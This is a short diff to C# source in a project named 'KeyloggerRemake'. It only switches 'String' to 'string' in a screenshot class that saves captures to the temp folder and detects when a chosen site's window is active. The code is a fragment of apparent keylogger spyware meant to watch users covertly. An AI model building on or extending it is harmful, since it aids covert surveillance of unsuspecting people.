@@ -7,12 +7,12 @@ namespace KeyloggerRemake
 {
     public class classScreenshot
     {
-        public String strScreenshotWindow = "";
-        public String strScreenshotFolder = Path.GetTempPath();
-        public String strScreenshotDate = classGetUserInfo.getShortDTime();
-        public String strScreenshotName;
+        public string strScreenshotWindow = "";
+        public string strScreenshotFolder = Path.GetTempPath();
+        public string strScreenshotDate = classGetUserInfo.getShortDTime();
+        public string strScreenshotName;
 
-        public classScreenshot(String strSiteTitle)
+        public classScreenshot(string strSiteTitle)
         {
             strScreenshotWindow = strSiteTitle;
             strScreenshotName = strScreenshotWindow + " " + strScreenshotDate;
@@ -32,7 +32,7 @@ namespace KeyloggerRemake
             }
         }
 
-        public static bool detectSpecificWindow(String strSiteTitle)
+        public static bool detectSpecificWindow(string strSiteTitle)
         {
             if (classGetUserInfo.strCurrentWindow != null && classGetUserInfo.strCurrentWindow.ToLower().Contains(strSiteTitle.ToLower()))
             {
